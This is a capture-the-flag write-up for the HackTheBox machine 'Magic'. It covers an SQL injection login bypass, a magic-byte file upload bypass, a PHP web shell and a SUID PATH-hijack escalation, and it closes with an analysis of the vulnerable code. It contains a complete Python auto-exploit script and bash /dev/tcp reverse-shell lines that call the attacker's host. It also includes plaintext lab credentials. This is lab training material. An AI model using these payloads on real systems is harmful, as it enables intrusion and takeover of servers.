---
title: "HackTheBox - Magic"
categories: [HackTheBox, Medium]
tags: [Linux,Medium,Web,OSWE]
mermaid: true
image: https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-23-HackTheBox-Magic/2021-09-23-HackTheBox-Magic%2011:36:51.png
---

Magic was a good box. It's Linux and Medium, from HackTheBox. We got two normal paths in HackTheBox. One SQLInjection to bypass the login and a file upload to get RCE.

The first shell is as www-data, then we upgrade to theseus with a credential on the mysql. The root part we get with a path hijack of a binary running with suid.

The autoshell for www-data is on the script. Hope you enjoy!

# Diagram

Here is the diagram for this machine. It's a resume from it.

```mermaid
graph TD
    A[Enumeration] -->|Nmap - Gobuster| B[Magic Web]
    B --> |SQLI Auth Bypass| C[Logged In]
    C --> |Change Magic Number| D(Upload Malicious PHP)
    D --> |RCE| E
    D --> |Python Script| E[Automated Reverse Shell]
    E --> |db.php| F[theseus creds]
    F --> |linpeas| G[sysinfo suid]
    G --> |ltrace| H[PATH hijack]
    H --> I[ROOT]
```

# Enumeration

First step is to enumerate the box. For this we'll use `nmap`

```sh
nmap -sV -sC -Pn 10.10.10.185
```

> -sV - Services running on the ports

> -sC - Run some standart scripts

> -Pn - Consider the host alive

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-23-HackTheBox-Magic/2021-09-23-HackTheBox-Magic%2009:35:51.png)

## Port 80

We try to open it on the browser

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-23-HackTheBox-Magic/2021-09-23-HackTheBox-Magic%2009:36:04.png)

We see a bunch of images in it, and a `Upload File` in the bottom of it

So we must login in the app

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-23-HackTheBox-Magic/2021-09-23-HackTheBox-Magic%2009:36:53.png)

We will try that with wfuzz, we get one request in burp, to see how it is structured

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-23-HackTheBox-Magic/2021-09-23-HackTheBox-Magic%2009:38:00.png)

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-23-HackTheBox-Magic/2021-09-23-HackTheBox-Magic%2009:37:52.png)

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-23-HackTheBox-Magic/2021-09-23-HackTheBox-Magic%2009:37:42.png)

Let's try all kind of injection to bypass the login and get access to the page

After spend a long time trying all kind of login bypasses

For example this wfuzz command with a [List](https://book.hacktricks.xyz/pentesting-web/login-bypass/sql-login-bypass)

```sh
wfuzz -z file,list.txt -d "username=adminFUZZ&password=admin" --hc 200 http://10.10.10.185/login.php
```

We see that a bunch of them works

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-23-HackTheBox-Magic/2021-09-23-HackTheBox-Magic%2009:46:11.png)

I'll use a simple one `'#`

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-23-HackTheBox-Magic/2021-09-23-HackTheBox-Magic%2009:48:29.png)

And it worked

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-23-HackTheBox-Magic/2021-09-23-HackTheBox-Magic%2009:48:40.png)

It worked possibly because the site is using a query like this one

```sql
SELECT * from users where username = '$username' and password = '$password';
```

So my input makes that:

```sql
SELECT * from users where username = 'admin''#and password = 'admin';
```

Awesome... let's continue

We try to upload a php file

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-23-HackTheBox-Magic/2021-09-23-HackTheBox-Magic%2009:52:22.png)

And it shows me

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-23-HackTheBox-Magic/2021-09-23-HackTheBox-Magic%2009:54:19.png)

### Filter Bypass

So, let's play with magic numbers, seems that is happening some kind of filter here

We add `FF D8 FF EE` in the beginning of the file, so it become a JPEG image (with hexeditor). Took from [Signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-23-HackTheBox-Magic/2021-09-23-HackTheBox-Magic%2010:06:28.png)

We upload, and success

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-23-HackTheBox-Magic/2021-09-23-HackTheBox-Magic%2010:07:09.png)

The problem is that this is a jpeg file, not a php file

We, on burp, change the name to `0x4rt3mis.php.jpeg` and succees

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-23-HackTheBox-Magic/2021-09-23-HackTheBox-Magic%2010:08:35.png)

We need to find the place where this file was uploaded

So, we run gobuster

```sh
gobuster dir -u http://10.10.10.185 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 30
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-23-HackTheBox-Magic/2021-09-23-HackTheBox-Magic%2010:12:49.png)

Again on the `images` folder

And we found it

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-23-HackTheBox-Magic/2021-09-23-HackTheBox-Magic%2010:13:25.png)

And we get RCE

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-23-HackTheBox-Magic/2021-09-23-HackTheBox-Magic%2010:11:26.png)

Getting a rev shell

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-23-HackTheBox-Magic/2021-09-23-HackTheBox-Magic%2010:18:23.png)

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-23-HackTheBox-Magic/2021-09-23-HackTheBox-Magic%2010:18:07.png)

And here it is

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-23-HackTheBox-Magic/2021-09-23-HackTheBox-Magic%2010:17:54.png)

Now, let's automate it.

# Auto Shell www-data

First, we will use our python skeleton to do that

```py
#!/usr/bin/python3

import argparse
import requests
import sys

'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()

'''Here come the Functions'''

def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    args = parser.parse_args()
    
    '''Here we call the functions'''
    
if __name__ == '__main__':
    main()
```

Here it is

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-23-HackTheBox-Magic/2021-09-23-HackTheBox-Magic%2011:16:09.png)

auto_www_data.py

```py
#!/usr/bin/python3
# Author: 0x4rt3mis
# Auto Rev Shell - Magic HackTheBox

import argparse
import requests
import sys
import socket, telnetlib
from threading import Thread
import base64
import urllib.parse

'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()

'''Here come the Functions'''

# Set the handler
def handler(lport,target):
    print("[+] Starting handler on %s [+]" %lport) 
    t = telnetlib.Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0',lport))
    s.listen(1)
    conn, addr = s.accept()
    print("[+] Connection from %s [+]" %target) 
    t.sock = conn
    print("[+] Shell'd [+]")
    t.interact()
        
# Upload Malicious
def maliciousUpload(rhost):
    url = "http://%s/upload.php" %rhost
    data = b'\xff\xd8\xff\xee\r\n\r\n<?php system($_REQUEST[\"cmd\"]); ?>'
    multipart_data = {
        'image': ('0x4rt3mis.php.jpeg', data, "image/jpeg"),
        'submit' : (None,"Upload Image")
    }
    upload = r.post(url, files=multipart_data, proxies=proxies)

# Trigger the reverse shell
def getReverse(rhost,lhost,lport):
    print("[+] Now Let's get the reverse shell! [+]")
    reverse = "bash -i >& /dev/tcp/%s/%s 0>&1" %(lhost,lport)
    message_bytes = reverse.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    base64_message = base64_bytes.decode('ascii')

    payload = {
    'cmd': 'echo ' + base64_message + '|base64 -d | bash'
}
    payload_str = urllib.parse.urlencode(payload, safe='|')
    url = "http://%s:80/images/uploads/0x4rt3mis.php.jpeg" %rhost
    r.get(url, params=payload_str, proxies=proxies, cookies=r.cookies)

def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    parser.add_argument('-ip', '--ipaddress', help='Local IP Adress', required=True)
    parser.add_argument('-lp', '--port', help='Local Port to Receive the Shell', required=True)
    args = parser.parse_args()

    rhost = args.target
    lhost = args.ipaddress
    lport = args.port
    
    '''Here we call the functions'''
    # Set up the handler
    thr = Thread(target=handler,args=(int(lport),rhost))
    thr.start()
    # Upload malicious php file
    maliciousUpload(rhost)
    # Get the rev shell
    getReverse(rhost,lhost,lport)

if __name__ == '__main__':
    main()
```

Let's continue our exploration

# www-data --> Theseus

Our first user to get is the theseus

Looking at the `db.php5` file in the web root directory we found some creds

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-23-HackTheBox-Magic/2021-09-23-HackTheBox-Magic%2011:21:57.png)

So, we use `mysqldump` to extracted the password (we could use `chisel` and port forward to our box the mysql port)

```sh
mysqldump --user=theseus --password=iamkingtheseus --host=localhost Magic
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-23-HackTheBox-Magic/2021-09-23-HackTheBox-Magic%2010:37:48.png)

On one line we see a credential

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-23-HackTheBox-Magic/2021-09-23-HackTheBox-Magic%2010:37:37.png)

Let's login as theseus

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-23-HackTheBox-Magic/2021-09-23-HackTheBox-Magic%2010:40:38.png)

# Theseus --> Root

Now, the root part

We run [Linpeas](https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh)

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-23-HackTheBox-Magic/2021-09-23-HackTheBox-Magic%2010:42:20.png)

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-23-HackTheBox-Magic/2021-09-23-HackTheBox-Magic%2010:42:37.png)

And we found a binary with `suid` enabled

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-23-HackTheBox-Magic/2021-09-23-HackTheBox-Magic%2010:46:22.png)

```sh
ltrace /bin/sysinfo
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-23-HackTheBox-Magic/2021-09-23-HackTheBox-Magic%2010:56:04.png)

We made a binary which is opened on popen in ltrace

```sh
echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.20/448 0>&1' > lshw
chmod +x lshw
cat lshw
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-23-HackTheBox-Magic/2021-09-23-HackTheBox-Magic%2010:59:18.png)

We fix the path

```sh
echo $PATH
export PATH="/tmp:$PATH"
echo $PATH  
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-23-HackTheBox-Magic/2021-09-23-HackTheBox-Magic%2011:00:08.png)

Now, just run sysinfo and we got a root shell in nc

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-23-HackTheBox-Magic/2021-09-23-HackTheBox-Magic%2011:00:47.png)

# Code Analisys

We copy the code to our box to better analyse it

```sh
rsync -azP -i root@10.10.10.185:/var/www/Magic/* .
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-23-HackTheBox-Magic/2021-09-23-HackTheBox-Magic%2011:16:24.png)

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-23-HackTheBox-Magic/2021-09-23-HackTheBox-Magic%2011:16:55.png)

The first thing is to look for why the webserver is executing png file as php

For that we see the `.htaccess`

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-23-HackTheBox-Magic/2021-09-23-HackTheBox-Magic%2011:19:46.png)

This regex doesn't have the trailing $, which means it will match is .php is anywhere in the string. That's why if the format `.php.png` is being executed as php file.

We need to see the upload mechanism also

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-23-HackTheBox-Magic/2021-09-23-HackTheBox-Magic%2011:20:43.png)

The first check is on the line 16

```php
if ($imageFileType != "jpg" && $imageFileType != "png" && $imageFileType != "jpeg") {
```

It checks if the file is jpg, png or jpeg.

The second check is on the line 23

```php
$check = exif_imagetype($_FILES["image"]["tmp_name"]);
```

Checking the `exif_imagetype` of the file

According to the [manual](https://www.php.net/manual/en/function.exif-imagetype.php) of php

```
exif_imagetype() reads the first bytes of an image and checks its signature.
When a correct signature is found, the appropriate constant value will be returned otherwise the return value is FALSE.
```

The two return values of interest here are IMAGETYPE_JPEG (2) and IMAGETYPE_JPNG (3), which show up in $allowed.

The third check is on line 31

```php
if (strpos($image, "<?") !== FALSE) {
```

It's commented because it's going to make the things extremelly hard and false positively, because it checks the `<?` on the string.

We also see the code of the sysinfo on the root folder

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-23-HackTheBox-Magic/2021-09-23-HackTheBox-Magic%2011:26:50.png)

This code makes a series of calls to various functions, all without full paths. I could have impersonated any of lshw, fdisk, cat, or free to get execution.